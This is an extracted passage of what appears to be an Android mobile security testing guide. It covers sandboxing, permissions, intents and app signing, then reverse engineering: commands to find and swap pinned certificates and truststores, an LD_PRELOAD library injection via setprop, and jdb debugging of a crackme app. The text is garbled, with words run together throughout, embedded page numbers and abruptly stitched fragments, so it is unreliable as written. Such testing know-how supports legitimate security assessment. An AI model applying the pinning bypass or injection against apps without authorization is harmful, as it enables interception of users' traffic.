andAndroidkeepstrackofallthepartsofthe applicationthatarefrequentlyused.

Android Security: Defense-in-Depth Approach TheAndroidarchitectureimplementsdifferentsecuritylayersthat, together, enableadefense-in-depthapproach. This meansthattheconfidentiality,integrityoravailabilityofsensitiveuser-dataorapplicationsdoesn’thingeononesingle security measure. This section brings an overview of the different layers of defense that the Android system provides. Thesecuritystrategycanberoughlycategorizedintofourdistinctdomains,eachfocusingonprotectingagainstcertain attackmodels. • System-widesecurity • Softwareisolation • Networksecurity • Anti-exploitation System-wide security Device encryption AndroidsupportsdeviceencryptionfromAndroid2.3.4(APIlevel10)andithasundergonesomebigchangessincethen. GoogleimposedthatalldevicesrunningAndroid6.0(APIlevel23)orhigherhadtosupportstorageencryption,although somelow-enddeviceswereexemptbecauseitwouldsignificantlyimpacttheirperformance. • Full-DiskEncryption(FDE):Android5.0(APIlevel21)andabovesupportfull-diskencryption. Thisencryptionuses asinglekeyprotectedbytheuser’sdevicepasswordtoencryptanddecrypttheuserdatapartition. Thiskindof encryption is now considered deprecated and file-based encryption should be used whenever possible. Full-disk encryptionhasdrawbacks,suchasnotbeingabletoreceivecallsornothavingoperativealarmsafterarebootif theuserdoesnotenterthepasswordtounlock. 92\\n• File-BasedEncryption(FBE):Android7.0(APIlevel24)supportsfile-basedencryption.

Permissions Androidimplementsanextensivepermissionssystemthatisusedasanaccesscontrolmechanism. Itensurescontrolled accesstosensitiveuserdataanddeviceresources. Androidcategorizespermissionsintodifferenttypesofferingvarious protectionlevels. Prior to Android 6.0 (API level 23), all permissions an app requested were granted at installation (Install-time per- missions). FromAPIlevel23onwards,theusermustapprovesomepermissionsrequestsduringruntime(Runtime permissions).

TolearnhowtotestapppermissionsrefertotheTestingAppPermissionssectioninthe“AndroidPlatformAPIs”chapter. Network security TLS by Default Bydefault,sinceAndroid9(APIlevel28),allnetworkactivityistreatedasbeingexecutedinahostileenvironment. This means that the Android system will only allow apps to communicate over a network channel that is established using the Transport Layer Security (TLS) protocol. This protocol effectively encrypts all network traffic and creates a secure channeltoaserver. Itmaybethecasethatyouwouldwanttousecleartrafficconnectionsforlegacyreasons.

Android Application Structure Communication with the Operating System Android apps interact with system services via the Android Framework, an abstraction layer that offers high-level Java APIs.

The App Sandbox AppsareexecutedintheAndroidApplicationSandbox,whichseparatestheappdataandcodeexecutionfromotherapps onthedevice. Asmentionedbefore,thisseparationaddsafirstlayerofdefense. Installationofanewappcreatesanewdirectorynamedaftertheapppackage,whichresultsinthefollowingpath: /data/ data/[package-name]. Thisdirectoryholdstheapp’sdata. Linuxdirectorypermissionsaresetsuchthatthedirectory canbereadfromandwrittentoonlywiththeapp’suniqueUID. We can confirm this by looking at the file system permissions in the /data/data folder. For example, we can see that GoogleChromeandCalendarareassignedonedirectoryeachandrununderdifferentuseraccounts: 96\\ndrwx------ 4u0_a97 u0_a97 40962017-01-1814:27com.android.calendar drwx------ 6u0_a120 u0_a120 40962017-01-1912:54com.android.chrome Developerswhowanttheirappstoshareacommonsandboxcansidestepsandboxing. Whentwoappsaresignedwith the same certificate and explicitly share the same user ID (having the sharedUserId in their AndroidManifest.xml files), eachcanaccesstheother’sdatadirectory. SeethefollowingexampletoachievethisintheNFCapp: <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.android.nfc\" android:sharedUserId=\"android.uid.nfc\"> Linux User Management AndroidleveragesLinuxusermanagementtoisolateapps. Thisapproachisdifferentfromusermanagementusagein traditional Linux environments, where multiple apps are often run by the same user. Android creates a unique UID for each Android app and runs the app in a separate process. Consequently, each app can access its own resources only. ThisprotectionisenforcedbytheLinuxkernel. Generally,appsareassignedUIDsintherangeof10000and99999. Androidappsreceiveausernamebasedontheir UID. For example, the app with UID 10188 receives the user name u0_a188. If the permissions an app requested are granted,thecorrespondinggroupIDisaddedtotheapp’sprocess. Forexample,theuserIDoftheappbelowis10188. ItbelongstothegroupID3003(inet). Thatgroupisrelatedtoandroid.permission.INTERNETpermission. Theoutputof theidcommandisshownbelow. $id uid=10188(u0_a188)gid=10188(u0_a188)groups=10188(u0_a188),3003(inet), 9997(everybody),50188(all_a188)context=u:r:untrusted_app:s0:c512,c768 TherelationshipbetweengroupIDsandpermissionsisdefinedinthefollowingfile: frameworks/base/data/etc/platform.xml <permission name=\"android.permission.INTERNET\" > <group gid=\"inet\" /> </permission> <permission name=\"android.permission.READ_LOGS\" > <group gid=\"log\" /> </permission> <permission name=\"android.permission.WRITE_MEDIA_STORAGE\" > <group gid=\"media_rw\" /> <group gid=\"sdcard_rw\" /> </permission> Zygote The process Zygote starts up during Android initialization. Zygote is a system service for launching apps. The Zygote process is a “base” process that contains all the core libraries the app needs. Upon launch, Zygote opens the socket /dev/socket/zygoteandlistensforconnectionsfromlocalclients. Whenitreceivesaconnection,itforksanewprocess, whichthenloadsandexecutestheapp-specificcode. App Lifecycle In Android, the lifetime of an app process is controlled by the operating system. A new Linux process is created when anappcomponentisstartedandthesameappdoesn’tyethaveanyothercomponentsrunning. Androidmaykillthis processwhenthelatterisnolongernecessaryorwhenreclaimingmemoryisnecessarytorunmoreimportantapps. The decisiontokillaprocessisprimarilyrelatedtothestateoftheuser’sinteractionwiththeprocess. Ingeneral,processes canbeinoneoffourstates. • Aforegroundprocess(e.g.,anactivityrunningatthetopofthescreenorarunningBroadcastReceiver) • Avisibleprocessisaprocessthattheuserisawareof,sokillingitwouldhaveanoticeablenegativeimpactonuser experience.

Apps must implement callback methods that react to a number of events; for example, the onCreate handler is called when the app process is first created. Other callback methods include onLowMemory, onTrimMemory and onConfigurationChanged. App Bundles Android applications can be shipped in two forms: the Android Package Kit (APK) file or an Android App Bundle (.aab). AndroidAppBundlesprovidealltheresourcesnecessaryforanapp,butdeferthegenerationoftheAPKanditssigning toGooglePlay. AppBundlesaresignedbinarieswhichcontainthecodeoftheappinseveralmodules. Thebasemodule containsthecoreoftheapplication. Thebasemodulecanbeextendedwithvariousmoduleswhichcontainnewenrich- ments/functionalities for the app as further explained on the developer documentation for app bundle. If you have an AndroidAppBundle,youcanbestusethebundletoolcommandlinetoolfromGoogletobuildunsignedAPKsinorderto usetheexistingtoolingontheAPK.YoucancreateanAPKfromanAABfilebyrunningthefollowingcommand: bundletoolbuild-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks IfyouwanttocreatesignedAPKsreadyfordeploymenttoatestdevice,use: $bundletoolbuild-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks --ks=/MyApp/keystore.jks --ks-pass=file:/MyApp/keystore.pwd --ks-key-alias=MyKeyAlias --key-pass=file:/MyApp/key.pwd WerecommendthatyoutestboththeAPKwithandwithouttheadditionalmodules,sothatitbecomesclearwhetherthe additionalmodulesintroduceand/orfixsecurityissuesforthebasemodule. Android Manifest Every app has an Android Manifest file, which embeds content in binary XML format. The standard name of this file is AndroidManifest.xml. Itislocatedintherootdirectoryoftheapp’sAndroidPackageKit(APK)file. Themanifestfiledescribestheappstructure,itscomponents(activities,services,contentproviders,andintentreceivers), andrequestedpermissions. Italsocontainsgeneralappmetadata,suchastheapp’sicon,versionnumber,andtheme. Thefilemaylistotherinformation,suchascompatibleAPIs(minimal,targeted,andmaximalSDKversion)andthekind ofstorageitcanbeinstalledon(externalorinternal).

App Components Androidappsaremadeofseveralhigh-levelcomponents. Themaincomponentsare: • Activities • Fragments • Intents • Broadcastreceivers • Contentprovidersandservices All these elements are provided by the Android operating system, in the form of predefined classes available through APIs. Activities Activities make up the visible part of any app. There is one activity per screen, so an app with three different screens implementsthreedifferentactivities. ActivitiesaredeclaredbyextendingtheActivityclass. Theycontainalluserinterface elements: fragments,views,andlayouts.

Content Providers Android uses SQLite to store data permanently: as with Linux, data is stored in files. SQLite is a light, efficient, open sourcerelationaldatastoragetechnologythatdoesnotrequiremuchprocessingpower,whichmakesitidealformobile use. An entire API with specific classes (Cursor, ContentValues, SQLiteOpenHelper, ContentProvider, ContentResolver, etc.) is available. SQLite is not run as a separate process; it is part of the app. By default, a database belonging to a givenappisaccessibletothisapponly.

Thisframeworkallowsbothpoint- to-pointandpublish-subscribemessaging. AnIntent isamessagingobjectthatcanbeusedtorequestanactionfrom another app component. Although intents facilitate inter-component communication in several ways, there are three fundamentalusecases: • Startinganactivity – An activity represents a single screen in an app. You can start a new instance of an activity by passing an intenttostartActivity. Theintentdescribestheactivityandcarriesnecessarydata. • Startingaservice – AServiceisacomponentthatperformsoperationsinthebackground,withoutauserinterface. WithAndroid 5.0(APIlevel21)andlater,youcanstartaservicewithJobScheduler. • Deliveringabroadcast – Abroadcastisamessagethatanyappcanreceive. Thesystemdeliversbroadcastsforsystemevents,includ- ingsystembootandcharginginitialization. Youcandeliverabroadcasttootherappsbypassinganintentto sendBroadcastorsendOrderedBroadcast. Therearetwotypesofintents. Explicitintentsnamethecomponentthatwillbestarted(thefullyqualifiedclassname). Forinstance: ExampleinJava: Intentintent =newIntent(this,myActivity.myClass); ExampleinKotlin: 102\\nvarintent =Intent(this,myActivity.myClass) ImplicitintentsaresenttotheOStoperformagivenactiononagivensetofdata(TheURLoftheOWASPwebsiteinour examplebelow). Itisuptothesystemtodecidewhichapporclasswillperformthecorrespondingservice. Forinstance: ExampleinJava: Intentintent =newIntent(Intent.MY_ACTION,Uri.parse(\"https://www.owasp.org\")); ExampleinKotlin: varintent =Intent(Intent.MY_ACTION,Uri.parse(\"https://www.owasp.org\")) An intent filter is an expression in Android Manifest files that specifies the type of intents the component would like to receive. Forinstance,bydeclaringanintentfilterforanactivity,youmakeitpossibleforotherappstodirectlystartyour activitywithacertainkindofintent. Likewise,youractivitycanonlybestartedwithanexplicitintentifyoudon’tdeclare anyintentfiltersforit. Androidusesintentstobroadcastmessagestoapps(suchasanincomingcallorSMS)importantpowersupplyinformation (lowbattery,forexample),andnetworkchanges(lossofconnection,forinstance). Extradatamaybeaddedtointents (throughputExtra/getExtras). Hereisashortlistofintentssentbytheoperatingsystem. AllconstantsaredefinedintheIntentclass,andthewhole listisintheofficialAndroiddocumentation: • ACTION_CAMERA_BUTTON • ACTION_MEDIA_EJECT • ACTION_NEW_OUTGOING_CALL • ACTION_TIMEZONE_CHANGED To improve security and privacy, a Local Broadcast Manager is used to send and receive intents within an app without havingthemsenttotherestoftheoperatingsystem. Thisisveryusefulforensuringthatsensitiveandprivatedatadon’t leavetheappperimeter(geolocationdataforinstance). Broadcast Receivers BroadcastReceiversarecomponentsthatallowappstoreceivenotificationsfromotherappsandfromthesystemitself. With them, apps can react to events (internal, initiated by other apps, or initiated by the operating system). They are generallyusedtoupdateuserinterfaces,startservices,updatecontent,andcreateusernotifications. TherearetwowaystomakeaBroadcastReceiverknowntothesystem.

According to Broadcasts Overview, a broadcast is considered “implicit” if it does not target an app specifically. After receivinganimplicitbroadcast,Androidwilllistallappsthathaveregisteredagivenactionintheirfilters. Ifmorethan oneapphasregisteredforthesameaction,Androidwillprompttheusertoselectfromthelistofavailableapps. An interesting feature of Broadcast Receivers is that they can be prioritized; this way, an intent will be delivered to all authorized receivers according to their priority. A priority can be assigned to an intent filter in the manifest via the android:priority attribute as well as programmatically via the IntentFilter.setPriority method. However, note thatreceiverswiththesameprioritywillberuninanarbitraryorder. Ifyourappisnotsupposedtosendbroadcastsacrossapps,useaLocalBroadcastManager(LocalBroadcastManager). Theycanbeusedtomakesureintentsarereceivedfromtheinternalapponly, andanyintentfromanyotherappwill bediscarded. Thisisveryusefulforimprovingsecurityandtheefficiencyoftheapp,asnointerprocesscommunication isinvolved. However,pleasenotethattheLocalBroadcastManagerclassisdeprecatedandGooglerecommendsusing alternativessuchasLiveData.

Creating Your Certificate Androidusespublic/privatecertificatestosignAndroidapps(.apkfiles). Certificatesarebundlesofinformation;interms of security, keys are the most important part of that bundle. Public certificates contain users’ public keys, and private certificates contain users’ private keys. Public and private certificates are linked. Certificates are unique and can’t be re-generated. Notethatifacertificateislost,itcannotberecovered,soupdatinganyappssignedwiththatcertificate becomesimpossible.

Forexample,GooglePlaywillrequirecertificates toremainvaliduntilOct22nd,2033atleast. Signing an Application The goal of the signing process is to associate the app file (.apk) with the developer’s public key. To achieve this, the developercalculatesahashoftheAPKfileandencryptsitwiththeirownprivatekey. Thirdpartiescanthenverifythe app’sauthenticity(e.g.,thefactthattheappreallycomesfromtheuserwhoclaimstobetheoriginator)bydecrypting theencryptedhashwiththeauthor’spublickeyandverifyingthatitmatchestheactualhashoftheAPKfile.

Publishing Process Distributing apps from anywhere (your own site, any store, etc.) is possible because the Android ecosystem is open.

If users want to install third-party apps from a non-trusted source, they mustexplicitlyallowthiswiththeirdevicesecuritysettings. Apps can be installed on an Android device from a variety of sources: locally via USB, via Google’s official app store (GooglePlayStore)orfromalternativestores.

Obtaining and Extracting Apps Platform: android There are several ways of extracting APK files from a device. You will need to decide which one is the easiest method dependingiftheappispublicorprivate. Alternative App Stores One of the easiest options is to download the APK from websites that mirror public applications from the Google Play Store. However,keepinmindthatthesesitesarenotofficialandthereisnoguaranteethattheapplicationhasn’tbeen repackagedorcontainmalware. AfewreputablewebsitesthathostAPKsandarenotknownformodifyingappsandeven listSHA-1andSHA-256checksumsoftheappsare: • APKMirror • APKPure Beware that you do not have control over these sites and you cannot guarantee what they do in the future. Only use themifit’syouronlyoptionleft. 111\\nUsing gplaycli Youcanusegplayclitodownload(-d)theselectedAPKbyspecifyingitsAppID(add-ptoshowaprogressbarand-vfor verbosity): $gplaycli -p-v-dcom.google.android.keep [INFO]GPlayCliversion3.26 [Python3.7.4] [INFO]Configurationfileis~/.config/gplaycli/gplaycli.conf [INFO]Deviceisbacon [INFO]Usingcachedtoken.

Testing Instant Apps With Google Play Instant you can create Instant apps which can be instantly launched from a browser or the “try now” buttonfromtheappstorefromAndroid5.0(APIlevel21)onward.

Patching Example: Making an App Debuggable Every debugger-enabled process runs an extra thread for handling JDWP protocol packets. This thread is started only forappsthathavetheandroid:debuggable=\"true\"flagsetintheirmanifestfile’s<application>element. Thisisthe typicalconfigurationofAndroiddevicesshippedtoendusers. When reverse engineering apps, you’ll often have access to the target app’s release build only. Release builds aren’t meanttobedebugged,that’sthepurposeofdebugbuilds.

Retrieving Strings Platform: android While performing any kind of binary analysis, strings can be considered as one of the most valuable starting points as they provide context. For example, an error log string like “Data encryption failed.” gives us a hint that the adjoining codemightberesponsibleforperformingsomekindofencryptionoperation. Java and Kotlin Bytecode As we already know, all the Java and Kotlin bytecode of an Android application is compiled into a DEX file. Each DEX filecontainsalistofstringidentifiers(strings_ids),whichcontainsallthestringidentifiersusedinthebinarywhenevera stringisreferred,includinginternalnaming(e.g,typedescriptors)orconstantobjectsreferredbythecode(e.ghardcoded strings). YoucansimplydumpthislistusingtoolssuchasGhidra(GUIbased)orDextra(CLIbased). With Ghidra, strings can be obtained by simply loading the DEX file and selectingWindow -> Defined strings in the menu. LoadinganAPKfiledirectlyintoGhidramightleadtoinconsistencies.

Forinstance,imagine thattheapphasasloginform,youcantakenoteofthedisplayedplaceholderortitletextoftheinputfieldsandusethat asanentrypointforyourstaticanalysis. Native Code In order to extract strings from native code used in an Android application, you can use GUI tools such as Ghidra or iaitoorrelyonCLI-basedtoolssuchasthestringsUnixutility(strings <path_to_binary>)orradare2’srabin2(rabin2 -zz <path_to_binary>).

Bypass Custom Certificate Pinning Statically Somewhereintheapplication,boththeendpointandthecertificate(oritshash)mustbedefined. Afterdecompilingthe application,youcansearchfor: • Certificatehashes: grep-ri\"sha256\\|sha1\"./smali. Replacetheidentifiedhasheswiththehashofyourproxy’s CA.Alternatively,ifthehashisaccompaniedbyadomainname,youcantrymodifyingthedomainnametoanon- existingdomainsothattheoriginaldomainisnotpinned. ThisworkswellonobfuscatedOkHTTPimplementations. • Certificatefiles: find ./assets -type f \\( -iname \\*.cer -o -iname \\*.crt \\). Replacethesefileswithyour proxy’scertificates,makingsuretheyareinthecorrectformat. • Truststore files: find ./ -type f \\( -iname \\*.jks -o -iname \\*.bks \\). Add your proxy’s certificates to the truststoreandmakesuretheyareinthecorrectformat. Keep in mind that an app might contain files without extension. The most common file locations areassets and resdirectories,whichshouldalsobeinvestigated. As an example, let’s say that you find an application which uses a BKS (BouncyCastle) truststore and it’s stored in the file res/raw/truststore.bks. To bypass SSL Pinning you need to add your proxy’s certificate to the truststore with thecommandlinetoolkeytool.

Inaddition,thefactthatpatchingisuniquetoeachapplicationcanalsobeconsidereda shortcoming,asthiscodecannotbeeasilyreused. Using library injection you can develop reusable libraries and inject them to different applications, effectively making thembehavedifferentlywithouthavingtomodifytheiroriginalsourcecode. ThisisknownasDLLinjectiononWindows (broadlyusedtomodifyandbypassanti-cheatmechanismsingames),LD_PRELOADonLinuxandDYLD_INSERT_LIBRARIES onmacOS.OnAndroidandiOS,acommonexampleisusingtheFridaGadgetwheneverFrida’sso-calledInjectedmode ofoperationisn’tsuitable(i.e.youcannotruntheFridaserveronthetargetdevice). Inthissituation,youcaninjectthe Gadgetlibrarybyusingthesamemethodsyou’regoingtolearninthissection. Libraryinjectionisdesirableinmanysituationssuchas: • Performingprocessintrospection(e.g.listingclasses, tracingmethodcalls, monitoringaccessedfiles, monitoring networkaccess,obtainingdirectmemoryaccess). • Supporting or replacing existing code with your own implementations (e.g. replace a function that should give randomnumbers). • Introducingnewfeaturestoanexistingapplication. • Debuggingandfixingelusiveruntimebugsoncodeforwhichyoudon’thavetheoriginalsource. • Enabledynamictestingonanon-rooteddevice(e.g.withFrida). Inthissection,wewilllearnabouttechniquesforperforminglibraryinjectiononAndroid,whichbasicallyconsistofpatch- ingtheapplicationcode(smaliornative)oralternativelyusingtheLD_PRELOADfeatureprovidedbytheOSloaderitself.

Alibrarycanalsobe injectedintoaprocessusingfunctionalitiesofferedbytheloaderoftheoperatingsystem. OnAndroid,whichisaLinux basedOS,youcanloadanadditionallibrarybysettingtheLD_PRELOADenvironmentvariable. Astheld.somanpagestates,symbolsloadedfromthelibrarypassedusingLD_PRELOADalwaysgetprecedence,i.e.they are searched first by the loader while resolving the symbols, effectively overriding the original ones. This feature is oftenusedtoinspecttheinputparametersofsomecommonlyusedlibcfunctionssuchasfopen,read,write,strcmp, etc., specially in obfuscated programs, where understanding their behavior may be challenging. Therefore, having an insightonwhichfiles arebeingopenedor whichstringsarebeing comparedmaybevery valuable. Thekeyidea here is“functionwrapping”,meaningthatyoucannotpatchsystemcallssuchaslibc’sfopen,butyoucanoverride(wrap)it includingcustomcodethatwill,forinstance,printtheinputparametersforyouandstillcalltheoriginalfopenremaining transparenttothecaller. OnAndroid,settingLD_PRELOADisslightlydifferentcomparedtootherLinuxdistributions. Ifyourecallfromthe“Platform Overview” section, every application in Android is forked from Zygote, which is started very early during the Android boot-up. Thus, setting LD_PRELOAD on Zygote is not possible. As a workaround for this problem, Android supports the setprop(setproperty)functionality. Belowyoucanseeanexampleforanapplicationwithpackagenamecom.foo.bar (notetheadditionalwrap. prefix): setpropwrap.com.foo.barLD_PRELOAD=/data/local/tmp/libpreload.so PleasenotethatifthelibrarytobepreloadeddoesnothaveSELinuxcontextassigned,fromAndroid5.0(APIlevel 21)onwards,youneedtodisableSELinuxtomakeLD_PRELOADwork,whichmayrequireroot. Debugging Platform: android Sofar,you’vebeenusingstaticanalysistechniqueswithoutrunningthetargetapps. Intherealworld,especiallywhen reversingmalwareormorecomplexapps,purestaticanalysisisverydifficult. Observingandmanipulatinganappduring runtimemakesitmuch,mucheasiertodecipheritsbehavior. Next,we’llhavealookatdynamicanalysismethodsthat helpyoudojustthat. Androidappssupporttwodifferenttypesofdebugging: DebuggingontheleveloftheJavaruntimewiththeJavaDebug Wire Protocol (JDWP), and Linux/Unix-style ptrace-based debugging on the native layer, both of which are valuable to reverseengineers. Debugging Release Apps DalvikandARTsupporttheJDWP,aprotocolforcommunicationbetweenthedebuggerandtheJavavirtualmachine(VM) thatitdebugs. JDWPisastandarddebuggingprotocolthat’ssupportedbyallcommandlinetoolsandJavaIDEs,including jdb,IntelliJ,andEclipse. Android’simplementationofJDWPalsoincludeshooksforsupportingextrafeaturesimplemented bytheDalvikDebugMonitorServer(DDMS). AJDWPdebuggerallowsyoutostepthroughJavacode,setbreakpointsonJavamethods,andinspectandmodifylocal andinstancevariables. You’lluseaJDWPdebuggermostofthetimeyoudebug“normal”Androidapps(i.e., appsthat don’tmakemanycallstonativelibraries). Inthefollowingsection,we’llshowhowtosolvetheUnCrackableAppforAndroidLevel1withjdbalone. Notethatthisis notanefficientwaytosolvethiscrackme. ActuallyyoucandoitmuchfasterwithFridaandothermethods,whichwe’ll introducelaterintheguide. This,however,servesasanintroductiontothecapabilitiesoftheJavadebugger. Debugging with jdb The adb command line tool was introduced in the “Android Basic Security Testing” chapter. You can use its adb jdwp commandtolisttheprocessIDsofalldebuggableprocessesrunningontheconnecteddevice(i.e.,processeshostinga 142\\nJDWPtransport). Withtheadb forwardcommand,youcanopenalisteningsocketonyourhostcomputerandforward thissocket’sincomingTCPconnectionstotheJDWPtransportofachosenprocess. $adbjdwp 12167 $adbforwardtcp:7777jdwp:12167 You’renowreadytoattachjdb. Attachingthedebugger,however,causestheapptoresume,whichyoudon’twant. You wanttokeepitsuspendedsothatyoucanexplorefirst. Topreventtheprocessfromresuming,pipethesuspendcommand intojdb: ${echo \"suspend\";cat;}|jdb-attach localhost:7777 Initializingjdb... >Allthreadssuspended. > You’re now attached to the suspended process and ready to go ahead with the jdb commands. Entering ? prints the completelistofcommands. Unfortunately,theAndroidVMdoesn’tsupportallavailableJDWPfeatures. Forexample,the redefine command, which would let you redefine a class code is not supported. Another important restriction is that linebreakpointswon’tworkbecausethereleasebytecodedoesn’tcontainlineinformation. Methodbreakpointsdowork, however. Usefulworkingcommandsinclude: • classes: listallloadedclasses • class/methods/fieldsclassid: Printdetailsaboutaclassandlistitsmethodsandfields • locals: printlocalvariablesincurrentstackframe • print/dumpexpr: printinformationaboutanobject • stopinmethod: setamethodbreakpoint • clearmethod: removeamethodbreakpoint • setlvalue=expr: assignnewvaluetofield/variable/arrayelement Let’s revisit the decompiled code from the UnCrackable App for Android Level 1 and think about possible solutions. A goodapproachwouldbesuspendingtheappinastatewherethesecretstringisheldinavariableinplaintextsoyou canretrieveit. Unfortunately,youwon’tgetthatfarunlessyoudealwiththeroot/tamperingdetectionfirst.

We’relookingforasecretstringstoredsomewhereinsidetheapp,sothenextstepistolookinside. First,unziptheAPK file(unzip UnCrackable-Level1.apk -d UnCrackable-Level1)and lookat thecontent. In thestandardsetup, allthe Javabytecodeandappdataisinthefileclasses.dexintheapprootdirectory(UnCrackable-Level1/). Thisfileconforms totheDalvikExecutableFormat(DEX),anAndroid-specificwayofpackagingJavaprograms. MostJavadecompilerstake plainclassfilesorJARsasinput,soyouneedtoconverttheclasses.dexfileintoaJARfirst. Youcandothiswithdex2jar orenjarify. Once you have a JAR file, you can use any free decompiler to produce Java code. In this example, we’ll use the CFR decompiler. CFRreleasesareavailableontheauthor’swebsite. CFRwasreleasedunderanMITlicense,soyoucanuse itfreelyeventhoughitssourcecodeisnotavailable. The easiest way to run CFR is through apkx, which also packages dex2jar and automates extraction, conversion, and decompilation. RunitontheAPKandyoushouldfindthedecompiledsourcesinthedirectoryUncrackable-Level1/src. Toviewthesources,asimpletexteditor(preferablywithsyntaxhighlighting)isfine,butloadingthecodeintoaJavaIDE makesnavigationeasier. Let’simportthecodeintoIntelliJ,whichalsoprovideson-devicedebuggingfunctionality. Open IntelliJ and select “Android” as the project type in the left tab of the “New Project” dialog. Enter “Uncrack- able1” as the application name and “vantagepoint.sg” as the company name. This results in the package name “sg.vantagepoint.uncrackable1”, which matches the original package name. Using a matching package name is important if you want to attach the debugger to the running app later on because IntelliJ uses the package name to identifythecorrectprocess. Inthe nextdialog, pick any APInumber; you don’t actuallywant to compile the project,",

Thelatteroptionhasaclearadvantage: itcanprovideyouwithcontext,asyou’llbeabletoseeinwhichcontext eachdomainisbeingused(e.g.classandmethod). From here on you can use this information to derive more insights which might be of use later during your analysis, e.g.youcouldmatchthedomainstothepinnedcertificatesortheNetworkSecurityConfigurationfileorperformfurther reconnaissance on domain names to know more about the target environment. When evaluating an application it is importanttochecktheNetworkSecurityConfigurationfile,asoften(lesssecure)debugconfigurationsmightbepushed intofinalreleasebuildsbymistake. Theimplementationandverificationofsecureconnectionscanbeanintricateprocessandtherearenumerousaspects to consider. For instance, many applications use other protocols apart from HTTP such as XMPP or plain TCP packets, or perform certificate pinning in an attempt to deter MITM attacks but unfortunately have severe logical bugs in its implementationoraninherentlywrongsecuritynetworkconfiguration. Rememberthatinmostofthecases,justusingstaticanalysiswillnotbeenoughandmighteventurntobeextremely inefficient when compared to the dynamic alternatives which will get much more reliable results (e.g. using an inter- ceptor proxy).

Emulation-based Analysis Platform: android The Android emulator is based on QEMU, a generic and open source machine emulator. QEMU emulates a guest CPU bytranslatingtheguestinstructionson-the-flyintoinstructionsthehostprocessorcanunderstand. Eachbasicblockof guestinstructionsisdisassembledandtranslatedintoanintermediaterepresentationcalledTinyCodeGenerator(TCG). TheTCGblockiscompiledintoablockofhostinstructions,storedinacodecache,andexecuted. Afterexecutionofthe basicblock,QEMUrepeatstheprocessforthenextblockofguestinstructions(orloadsthealreadytranslatedblockfrom thecache). Thewholeprocessiscalleddynamicbinarytranslation. BecausetheAndroidemulatorisaforkofQEMU,itcomeswithallQEMUfeatures,includingmonitoring,debugging,and tracingfacilities. QEMU-specificparameterscanbepassedtotheemulatorwiththe-qemucommandlineflag.

Forexample,ifablockisrepeatedly executed in a loop, only the first iteration will be printed to the log. There’s no way to disable TB caching in QEMU (besideshackingthesourcecode).

We’lllookatAndroid’sAPIsforlocaldatastorageandsharebestpractices. While it’s preferable to limit sensitive data on local storage, or avoid it at all whenever possible, practical use cases oftennecessitateuserdatastorage. Forexample,toimproveuserexperience,appscacheauthenticationtokenslocally, circumventingtheneedforcomplexpasswordentryateachappstart. Appsmayalsoneedtostorepersonallyidentifiable information(PII)andothersensitivedata. Sensitivedatacanbecomevulnerableifimproperlyprotected,potentiallystoredinvariouslocations,includingthedevice oranexternalSDcard. It’simportanttoidentifytheinformationprocessedbythemobileappandclassifywhatcounts as sensitive data. Check out the “Identifying Sensitive Data” section in the “Mobile App Security Testing” chapter for data classification details. Refer to Security Tips for Storing Data in the Android developer’s guide for comprehensive insights. Sensitive information disclosure risks include potential information decryption, social engineering attacks (if PII is dis- closed), account hijacking (if session information or an authentication token is disclosed), and app exploitation with a paymentoption. In addition to data protection, validate and sanitize data from any storage source. This includes checking correct data typesandimplementingcryptographiccontrols,suchasHMACs,fordataintegrity. Androidoffersvariousdatastoragemethods,tailoredtousers,developers,andapplications. Commonpersistentstorage techniquesinclude: • SharedPreferences • SQLiteDatabases • FirebaseDatabases • RealmDatabases • InternalStorage • ExternalStorage • Keystore Additionally,otherAndroidfunctionsthatcanresultindatastorageandshouldbetestedinclude: • LoggingFunctions • AndroidBackups • ProcessesMemory • KeyboardCaches • Screenshots Understanding each relevant data storage function is crucial for performing the appropriate test cases. This overview providesabriefoutlineofthesedatastoragemethodsandpointstesterstofurtherrelevantdocumentation. Shared Preferences The SharedPreferences API is commonly used to permanently save small collections of key-value pairs. Data stored in a SharedPreferences object is written to a plain-text XML file. The SharedPreferences object can be declared world- readable(accessibletoallapps)orprivate. MisuseoftheSharedPreferencesAPIcanoftenleadtoexposureofsensitive data.

Secure Key Import into Keystore Android 9 (API level 28) adds the ability to import keys securely into the AndroidKeystore. First, AndroidKeystore generatesakeypairusingPURPOSE_WRAP_KEY,whichshouldalsobeprotectedwithanattestationcertificate. Thispair aims to protect the Keys being imported to AndroidKeystore. The encrypted keys are generated as ASN.1-encoded message in the SecureKeyWrapper format, which also contains a description of the ways the imported key is allowed to be used. The keys are then decrypted inside the AndroidKeystore hardware belonging to the specific device that generatedthewrappingkey,sothattheyneverappearasplaintextinthedevice’shostmemory. 196\\nFigure 2: Secure key import into Keystore ExampleinJava: KeyDescription ::=SEQUENCE { keyFormatINTEGER, authorizationListAuthorizationList } SecureKeyWrapper ::=SEQUENCE { wrapperFormatVersionINTEGER, encryptedTransportKeyOCTET_STRING, initializationVectorOCTET_STRING, keyDescriptionKeyDescription, secureKeyOCTET_STRING, tagOCTET_STRING } ThecodeabovepresentsthedifferentparameterstobesetwhengeneratingtheencryptedkeysintheSecureKeyWrapper format.

There are certain limitations ofreliablycleaningupsecretdatainlanguageswithgarbagecollector(Java)andimmutablestrings(Swift,Objective-C, Kotlin). Java Cryptography Architecture Reference Guide suggests using char[] instead of String for storing sensitive data,andnullifyarrayafterusage. Note that some ciphers do not properly clean up their byte-arrays. For instance, the AES Cipher in BouncyCastle does notalwayscleanupitslatestworkingkey,leavingsomecopiesofthebyte-arrayinmemory. Next,BigIntegerbasedkeys (e.g.privatekeys)cannotberemovedfromtheheap,norzeroedoutwithoutadditionaleffort. Clearingbytearraycanbe achievedbywritingawrapperwhichimplementsDestroyable. Storing Keys using Android KeyStore API A more user-friendly and recommended way is to use the Android KeyStore API system (itself or through KeyChain) to storekeymaterial. Ifitispossible, hardware-backedstorageshouldbeused. Otherwise, itshouldfallbacktosoftware implementationofAndroidKeystore. However,beawarethattheAndroidKeyStoreAPIhasbeenchangedsignificantly throughoutversionsofAndroid. Inearlierversions, theAndroidKeyStoreAPIonlysupportedstoringpublic/privatekey pairs(e.g.,RSA).SymmetrickeysupporthasonlybeenaddedsinceAndroid6.0(APIlevel23).

